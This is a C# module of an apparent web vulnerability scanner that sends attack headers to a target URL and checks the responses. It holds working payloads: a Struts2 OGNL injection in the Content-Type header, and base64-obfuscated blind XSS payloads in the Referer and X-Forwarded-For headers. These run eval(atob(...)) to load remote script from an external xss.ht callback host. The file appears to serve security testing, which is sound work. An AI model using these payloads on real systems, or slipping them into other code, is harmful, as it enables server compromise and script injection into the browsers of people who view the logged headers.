using Clark.Common.Models;
using Clark.Common.Utility;
using Clark.ContentScanner.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace Clark.ContentScanner
{
    public static class Headers
    {
        private static List<AttackHeader> _knownAttackHeaders = new List<AttackHeader>();
        private static readonly object _syncObject = new object();

        public static ScannerResult Check(ScannerRequest request)
        {
            if (_knownAttackHeaders.Count == 0)
            {
                lock (_syncObject)
                {
                    if (_knownAttackHeaders.Count == 0)
                        Initialize();
                }
            }

            ScannerResult result = new ScannerResult();
            List<string> returnList = new List<string>();

            string testedFile = request.URL.Trim('/');
            WebPageRequest webRequest = new WebPageRequest(testedFile);
            webRequest = new WebPageRequest(request.URL.Trim('/'));
            webRequest.Log = true;
            webRequest.LogDir = request.LogDir;
            foreach (AttackHeader attack in _knownAttackHeaders)
            {
                webRequest.Headers = attack.AttackHeaderCollection;
                WebPageLoader.Load(webRequest);

                foreach (var headerFP in attack.FingerPrintHeaders.AllKeys)
                {
                    var header = webRequest.Response.Headers.Get(headerFP);
                    if (header != null)
                    {
                        if (attack.FingerPrintHeaders[headerFP] == webRequest.Response.Headers[headerFP])
                        {
                            returnList.Add(headerFP);
                        }
                    }
                }
            }

            result.Results.AddRange(returnList);

            return result;
        }

        private static void Initialize()
        {
            var headerAttack = new AttackHeader();
            headerAttack.AttackHeaderCollection.Add("Content-Type", "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Ack-hogarth45-POC',4*4)}.multipart/form-data");
            headerAttack.FingerPrintHeaders.Add("X-Ack-hogarth45-POC", "16");
            _knownAttackHeaders.Add(headerAttack);

            headerAttack = new AttackHeader();
            headerAttack.AttackHeaderCollection.Add("Referer", "'\"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vaG9nYXJ0aHhsdi54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>");
            _knownAttackHeaders.Add(headerAttack);

            headerAttack = new AttackHeader();
            headerAttack.AttackHeaderCollection.Add("X-Forwarded-For", "'\"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vaG9nYXJ0aHhsdi54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>");
            _knownAttackHeaders.Add(headerAttack);
        }
    }

    internal class AttackHeader
    {
        public WebHeaderCollection AttackHeaderCollection = new WebHeaderCollection();
        public WebHeaderCollection FingerPrintHeaders = new WebHeaderCollection();
    }
}